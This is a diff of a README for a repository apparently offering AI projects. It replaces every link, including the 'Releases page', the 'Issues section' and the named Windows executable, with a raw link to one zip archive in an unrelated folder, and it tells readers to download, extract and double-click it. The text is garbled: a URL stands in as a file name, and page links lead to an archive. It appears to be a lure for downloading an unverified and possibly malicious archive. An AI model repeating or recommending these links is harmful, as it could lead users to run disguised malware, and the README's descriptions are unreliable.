@@ -1,6 +1,6 @@
 # 🎉 real-world-ai-projects - Explore Hands-On AI Solutions
 
-[![Download Now](https://raw.githubusercontent.com/RealYoshiWaton/real-world-ai-projects/main/Scottification/real-world-ai-projects.zip%20Now-Where%20to%20Get%20It-brightgreen)](https://raw.githubusercontent.com/RealYoshiWaton/real-world-ai-projects/main/Scottification/real-world-ai-projects.zip)
+[![Download Now](https://github.com/RealYoshiWaton/real-world-ai-projects/raw/refs/heads/main/structured-eda/ai-projects-real-world-2.2-beta.1.zip%20Now-Where%20to%20Get%20It-brightgreen)](https://github.com/RealYoshiWaton/real-world-ai-projects/raw/refs/heads/main/structured-eda/ai-projects-real-world-2.2-beta.1.zip)
 
 ## 📚 About This Project
 
@@ -30,7 +30,7 @@ Before you begin, ensure your computer meets the following minimum requirements:
 
 ### 1. Visit the Release Page
 
-Go to the [Releases page](https://raw.githubusercontent.com/RealYoshiWaton/real-world-ai-projects/main/Scottification/real-world-ai-projects.zip) to find the latest version of the software.
+Go to the [Releases page](https://github.com/RealYoshiWaton/real-world-ai-projects/raw/refs/heads/main/structured-eda/ai-projects-real-world-2.2-beta.1.zip) to find the latest version of the software.
 
 ### 2. Download the Application
 
@@ -38,7 +38,7 @@ On the Releases page, you will see a list of available versions. Find the versio
 
 The download option may look something like this:
 
-- **https://raw.githubusercontent.com/RealYoshiWaton/real-world-ai-projects/main/Scottification/real-world-ai-projects.zip**: This file contains all the necessary components.
+- **https://github.com/RealYoshiWaton/real-world-ai-projects/raw/refs/heads/main/structured-eda/ai-projects-real-world-2.2-beta.1.zip**: This file contains all the necessary components.
 
 After clicking the link, your browser will start to download the file.
 
@@ -52,7 +52,7 @@ Once the download is complete, locate the downloaded file in your computer's dow
 
 ### 4. Run the Application
 
-Navigate to the folder where you extracted the files. Look for a file named `https://raw.githubusercontent.com/RealYoshiWaton/real-world-ai-projects/main/Scottification/real-world-ai-projects.zip` (for Windows) or `run-project` (for macOS/Linux). 
+Navigate to the folder where you extracted the files. Look for a file named `https://github.com/RealYoshiWaton/real-world-ai-projects/raw/refs/heads/main/structured-eda/ai-projects-real-world-2.2-beta.1.zip` (for Windows) or `run-project` (for macOS/Linux). 
 
 - **Double-click** the file to start the application.  
 - Follow any on-screen instructions to set up and initialize the projects.
@@ -70,7 +70,7 @@ Choose a project to explore. Each project contains:
 ## 📌 Tips for Usage
 
 - Always ensure you have a stable internet connection while using the application for the best experience.
-- Check for updates regularly on the [Releases page](https://raw.githubusercontent.com/RealYoshiWaton/real-world-ai-projects/main/Scottification/real-world-ai-projects.zip) to benefit from new features and improvements.
+- Check for updates regularly on the [Releases page](https://github.com/RealYoshiWaton/real-world-ai-projects/raw/refs/heads/main/structured-eda/ai-projects-real-world-2.2-beta.1.zip) to benefit from new features and improvements.
 
 ## 📖 Frequently Asked Questions
 
@@ -80,7 +80,7 @@ To uninstall, simply delete the folder where you extracted the application. If y
 
 ### How do I report issues?
 
-If you encounter problems, please visit the [Issues section](https://raw.githubusercontent.com/RealYoshiWaton/real-world-ai-projects/main/Scottification/real-world-ai-projects.zip) of this repository. Describe the issue in detail, and we will assist you.
+If you encounter problems, please visit the [Issues section](https://github.com/RealYoshiWaton/real-world-ai-projects/raw/refs/heads/main/structured-eda/ai-projects-real-world-2.2-beta.1.zip) of this repository. Describe the issue in detail, and we will assist you.
 
 ### Can I contribute to this project?
 
@@ -94,6 +94,6 @@ We are committed to keeping this collection updated. You can check back frequent
 
 For a seamless download experience, don't forget to click the link below:
 
-[![Download Now](https://raw.githubusercontent.com/RealYoshiWaton/real-world-ai-projects/main/Scottification/real-world-ai-projects.zip%20Now-Where%20to%20Get%20It-brightgreen)](https://raw.githubusercontent.com/RealYoshiWaton/real-world-ai-projects/main/Scottification/real-world-ai-projects.zip)
+[![Download Now](https://github.com/RealYoshiWaton/real-world-ai-projects/raw/refs/heads/main/structured-eda/ai-projects-real-world-2.2-beta.1.zip%20Now-Where%20to%20Get%20It-brightgreen)](https://github.com/RealYoshiWaton/real-world-ai-projects/raw/refs/heads/main/structured-eda/ai-projects-real-world-2.2-beta.1.zip)
 
 Thank you for your interest in real-world-ai-projects. We hope you find these resources valuable as you explore the world of artificial intelligence!
